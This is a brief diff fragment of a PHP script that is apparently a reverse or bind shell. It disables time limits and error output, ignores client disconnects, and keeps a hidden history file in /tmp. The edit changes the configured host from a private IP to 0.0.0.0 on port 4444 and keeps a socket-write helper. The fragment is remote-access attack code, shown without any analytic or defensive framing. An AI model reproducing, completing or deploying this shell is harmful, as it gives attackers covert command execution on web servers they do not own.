@@ -2,7 +2,7 @@
 set_time_limit(0);error_reporting(0);ignore_user_abort(true);
 @ini_set('max_execution_time','0');@ini_set('memory_limit','-1');
 
-$CFG=array('host'=>'10.13.5.162','port'=>4444,'reconnect'=>5,'timeout'=>30,
+$CFG=array('host'=>'0.0.0.0','port'=>4444,'reconnect'=>5,'timeout'=>30,
     'hist'=>array(),'hist_idx'=>0,'hist_file'=>'/tmp/.ph_nhist');
 
 function sw($s,$d){$l=strlen($d);$w=0;while($w<$l){$n=@fwrite($s,substr($d,$w));if(!$n)return false;$w+=$n;}return true;}
